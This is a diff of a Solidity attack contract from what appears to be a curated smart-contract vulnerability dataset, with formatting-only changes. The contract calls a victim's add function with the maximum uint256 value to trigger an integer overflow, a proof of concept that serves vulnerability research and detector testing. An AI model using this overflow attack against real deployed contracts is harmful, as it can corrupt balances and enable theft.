+++ smartbugs-curated/0.4.x/contracts/arithmetic/integer_overflow_1_attack.sol
@@ -5,12 +5,12 @@ import "../dataset/arithmetic/integer_overflow_1.sol";
 contract OverflowAttacker {
     Overflow public victim_contract;
 
-    constructor (address _overflowAddress) public {
+    constructor(address _overflowAddress) public {
         victim_contract = Overflow(_overflowAddress);
     }
 
     function addMax() public {
-        uint maxUint = 2**256 - 1;
+        uint256 maxUint = 2 ** 256 - 1;
 
         victim_contract.add(maxUint);
     }
